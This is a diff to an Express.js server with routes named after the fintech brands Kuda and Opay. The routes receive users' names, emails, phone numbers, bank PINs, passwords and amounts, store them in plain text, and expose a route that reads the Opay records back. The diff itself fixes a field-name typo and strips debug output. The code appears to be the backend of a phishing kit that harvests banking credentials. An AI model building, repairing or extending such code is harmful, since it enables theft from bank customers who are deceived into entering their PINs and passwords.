@@ -128,16 +128,11 @@ app.post("/PostKudaData", (req, res)=>{
     const phoneNumber = req.body.phoneNumber;
     const pin = req.body.pin;
     const password = req.body.password;
-    const amount = req.body.amout;
-    let testLoad = "It loaded the post But waiting"
+    const amount = req.body.amount; 
     db.query(postKudaDataQuery, [firstName, lastName, email, phoneNumber, pin, password, amount], (err, result)=>{
-        //if(err) throw err;
-        if(err){
-            errdb = err;
-        }
+        if(err) throw err;
     });
-    res.send({'loadMessage':testLoad, 'dbMessage':errdb});
-    //res.end();
+    res.end();
 });
 app.get("/GetOpayData", (req, res)=>{
     db.query(getOpayDataQuery, (err, result)=>{
@@ -152,7 +147,7 @@ app.post("/PostOpayData", (req, res)=>{
     const phoneNumber = req.body.phoneNumber;
     const pin = req.body.pin;
     const password = req.body.password;
-    const amount = req.body.amout;
+    const amount = req.body.amount;
     db.query(postOpayDataQuery, [firstName, lastName, email, phoneNumber, pin, password, amount], (err, result)=>{
         if(err) throw err;
     });
